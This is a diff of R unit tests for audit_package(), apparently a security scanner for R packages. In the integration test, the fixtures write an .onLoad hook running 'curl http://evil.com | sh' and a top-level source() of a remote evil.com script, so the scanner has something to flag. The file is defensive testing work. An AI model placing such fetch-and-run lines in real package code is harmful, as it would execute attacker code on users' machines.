@@ -1,143 +1,92 @@
-# Helper: create a minimal package directory structure with a single R file
-# in R/, simulating a real package root for audit_package().
-make_test_pkg <- function(r_content, dir_name) {
-  pkg_dir <- file.path(tempdir(), dir_name)
-  r_dir   <- file.path(pkg_dir, "R")
-  dir.create(r_dir, recursive = TRUE, showWarnings = FALSE)
-  writeLines("Package: testpkg\nVersion: 0.1.0", file.path(pkg_dir, "DESCRIPTION"))
-  writeLines(r_content, file.path(r_dir, "zzz.R"))
-  pkg_dir
-}
+rules <- load_rules()
 
+# structure --------------------------------------------------------------------
+test_that("audit_package() returns a pkgaudit object of four frames plus metadata", {
+  pkg <- make_pkg(files = list("R/zzz.R" = "invisible(NULL)"))
+  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
 
-# audit_package(): error paths -------------------------------------------------
-test_that("audit_package() stops if no DESCRIPTION file found", {
-  tmp <- file.path(tempdir(), "notapkg")
-  dir.create(tmp, showWarnings = FALSE)
-  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)
-
-  expect_error(
-    audit_package(tmp, rules = load_rules()),
-    "No DESCRIPTION file found"
-  )
-})
-
-
-# audit_package(): happy path --------------------------------------------------
-# For each rule in the database, verify that the positive fixture produces a
-# finding and the negative fixture does not. Fixture files are generated from
-# the YAML rule files by inst/scripts/build_rules.R.
-test_that("each rule detects positive cases and ignores negative cases", {
-  rules    <- load_rules()
-  fix_root <- testthat::test_path("fixtures", "rules")
-
-  for (rule_name in names(rules)) {
-    rule_dir  <- file.path(fix_root, rule_name)
-    positives <- sort(list.files(rule_dir, pattern = "^positive_[0-9]+\\.R$", full.names = TRUE))
-    negatives <- sort(list.files(rule_dir, pattern = "^negative_[0-9]+\\.R$", full.names = TRUE))
-
-    # At least one fixture of each kind must exist for every rule in the database
-    expect_true(
-      length(positives) > 0L,
-      label = paste0(rule_name, ": at least one positive fixture exists")
-    )
-    expect_true(
-      length(negatives) > 0L,
-      label = paste0(rule_name, ": at least one negative fixture exists")
-    )
-
-    if (length(positives) == 0L || length(negatives) == 0L) next
-
-    single_rule <- rules[rule_name]
-
-    for (j in seq_along(positives)) {
-      pkg_pos <- make_test_pkg(
-        readLines(positives[[j]]),
-        paste0(rule_name, "_pos_", j)
-      )
-      on.exit(unlink(pkg_pos, recursive = TRUE), add = TRUE)
-
-      pos_result <- audit_package(pkg_pos, rules = single_rule)
-      expect_s3_class(pos_result, "pkgaudit_result")
-      expect_true(
-        nrow(pos_result$findings) > 0L,
-        label = paste0(rule_name, "/positive_", j, ": positive case detected")
-      )
-    }
-
-    for (j in seq_along(negatives)) {
-      pkg_neg <- make_test_pkg(
-        readLines(negatives[[j]]),
-        paste0(rule_name, "_neg_", j)
-      )
-      on.exit(unlink(pkg_neg, recursive = TRUE), add = TRUE)
-
-      expect_message(
-        neg_result <- audit_package(pkg_neg, rules = single_rule),
-        "No security findings"
-      )
-      expect_s3_class(neg_result, "pkgaudit_result")
-      expect_equal(
-        nrow(neg_result$findings), 0L,
-        label = paste0(rule_name, "/negative_", j, ": negative case not flagged")
-      )
-      expect_equal(
-        length(neg_result$errors), 0L,
-        label = paste0(rule_name, "/negative_", j, ": negative case has no parse errors")
-      )
-    }
+  res <- audit_package(pkg, rules)
+  expect_s3_class(res, "pkgaudit")
+  expect_named(res, c("file_contexts", "code_contexts", "patterns", "errors",
+                      "metadata"))
+  for (nm in c("file_contexts", "code_contexts", "patterns", "errors")) {
+    expect_s3_class(res[[nm]], "data.frame")
   }
+  expect_type(res$metadata, "list")
+
+  expect_named(res$file_contexts, c("file_context", "file_path", "message"))
+  expect_named(res$code_contexts,
+               c("code_context", "file_context", "line_number",
+                 "column_number", "message"))
+  expect_named(res$patterns,
+               c("pattern", "file_context", "line_number", "column_number",
+                 "message", "attck", "code_context"))
+  expect_named(res$errors, c("stage", "file_context", "rule", "message"))
 })
 
-
-# audit_package(): scan scope --------------------------------------------------
-
-test_that("audit_package() detects findings in R/unix/", {
-  pkg_dir <- file.path(tempdir(), "testpkg_unix")
-  on.exit(unlink(pkg_dir, recursive = TRUE), add = TRUE)
-  dir.create(file.path(pkg_dir, "R", "unix"), recursive = TRUE, showWarnings = FALSE)
-  writeLines("Package: testpkg\nVersion: 0.1.0", file.path(pkg_dir, "DESCRIPTION"))
-  writeLines(".onLoad <- function(l, p) system('id')", file.path(pkg_dir, "R", "unix", "zzz.R"))
-
-  result <- audit_package(pkg_dir, rules = load_rules())
-  expect_gt(nrow(result$findings), 0L)
-  expect_true(all(startsWith(result$findings$file, "R/unix/")))
+test_that("audit_package() errors on a non-directory", {
+  expect_error(audit_package(tempfile()), "dir.exists")
 })
 
-test_that("audit_package() detects findings in R/windows/", {
-  pkg_dir <- file.path(tempdir(), "testpkg_windows")
-  on.exit(unlink(pkg_dir, recursive = TRUE), add = TRUE)
-  dir.create(file.path(pkg_dir, "R", "windows"), recursive = TRUE, showWarnings = FALSE)
-  writeLines("Package: testpkg\nVersion: 0.1.0", file.path(pkg_dir, "DESCRIPTION"))
-  writeLines(".onLoad <- function(l, p) system('id')", file.path(pkg_dir, "R", "windows", "zzz.R"))
+# integration ------------------------------------------------------------------
+test_that("audit_package() finds file contexts, code contexts and patterns", {
+  pkg <- make_pkg(files = list(
+    "configure"          = "#!/bin/sh",
+    "src/Makevars"       = "all:",
+    "src/install.libs.R" = "system2('echo', 'x')",
+    "R/zzz.R" = c(
+      ".onLoad <- function(libname, pkgname) {",
+      "  system('curl http://evil.com | sh')",
+      "}",
+      "source('http://evil.com/top.R')"
+    )
+  ))
+  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
 
-  result <- audit_package(pkg_dir, rules = load_rules())
-  expect_gt(nrow(result$findings), 0L)
-  expect_true(all(startsWith(result$findings$file, "R/windows/")))
+  res <- audit_package(pkg, rules)
+
+  expect_setequal(res$file_contexts$file_path,
+                  c("configure", "src/Makevars", "src/install.libs.R"))
+  expect_true("onload_code" %in% res$code_contexts$code_context)
+
+  # system() in the hook, source() at top level, system2() at top level of
+  # install.libs.R -> the three code-context labels are attributed correctly.
+  sys_hook <- res$patterns[res$patterns$pattern == "system_pattern" &
+                             res$patterns$file_context == "R/zzz.R", ]
+  expect_equal(sys_hook$code_context, "onload_code")
+
+  src_top <- res$patterns[res$patterns$pattern == "source_pattern", ]
+  expect_equal(src_top$code_context, "Top-level")
+
+  installlibs <- res$patterns[res$patterns$file_context == "src/install.libs.R", ]
+  expect_equal(installlibs$pattern, "system_pattern")
+  expect_equal(installlibs$code_context, "Top-level")
+
+  expect_equal(nrow(res$errors), 0L)
 })
 
-test_that("audit_package() detects findings in src/install.libs.R", {
-  pkg_dir <- file.path(tempdir(), "testpkg_src")
-  on.exit(unlink(pkg_dir, recursive = TRUE), add = TRUE)
-  dir.create(file.path(pkg_dir, "R"),   recursive = TRUE, showWarnings = FALSE)
-  dir.create(file.path(pkg_dir, "src"), recursive = TRUE, showWarnings = FALSE)
-  writeLines("Package: testpkg\nVersion: 0.1.0", file.path(pkg_dir, "DESCRIPTION"))
-  writeLines(".onLoad <- function(l, p) system('id')", file.path(pkg_dir, "src", "install.libs.R"))
+test_that("audit_package() reports relative-path parse errors and continues", {
+  pkg <- make_pkg(files = list(
+    "R/bad.R"  = ")invalid R syntax(",
+    "R/good.R" = "system('id')"
+  ))
+  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
 
-  result <- audit_package(pkg_dir, rules = load_rules())
-  expect_gt(nrow(result$findings), 0L)
-  expect_true(any(result$findings$file == "src/install.libs.R"))
+  res <- audit_package(pkg, rules)
+  expect_equal(nrow(res$errors), 1L)
+  expect_equal(res$errors$stage, "parse_script")
+  expect_equal(res$errors$file_context, "R/bad.R")
+  # The good file was still audited despite the bad one.
+  expect_true("R/good.R" %in% res$patterns$file_context)
 })
 
-test_that("audit_package() returns relative paths in $errors", {
-  pkg_dir <- file.path(tempdir(), "testpkg_errs")
-  on.exit(unlink(pkg_dir, recursive = TRUE), add = TRUE)
-  dir.create(file.path(pkg_dir, "R"), recursive = TRUE, showWarnings = FALSE)
-  writeLines("Package: testpkg\nVersion: 0.1.0", file.path(pkg_dir, "DESCRIPTION"))
-  writeLines(")invalid R syntax", file.path(pkg_dir, "R", "bad.R"))
+test_that("audit_package() on a package with no scannable content is empty", {
+  pkg <- make_pkg()
+  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
 
-  result <- audit_package(pkg_dir, rules = load_rules())
-  expect_gt(length(result$errors), 0L)
-  expect_false(any(startsWith(names(result$errors), tempdir())))
-  expect_true(all(startsWith(names(result$errors), "R/")))
+  res <- audit_package(pkg, rules)
+  expect_equal(nrow(res$file_contexts), 0L)
+  expect_equal(nrow(res$code_contexts), 0L)
+  expect_equal(nrow(res$patterns), 0L)
+  expect_equal(nrow(res$errors), 0L)
 })
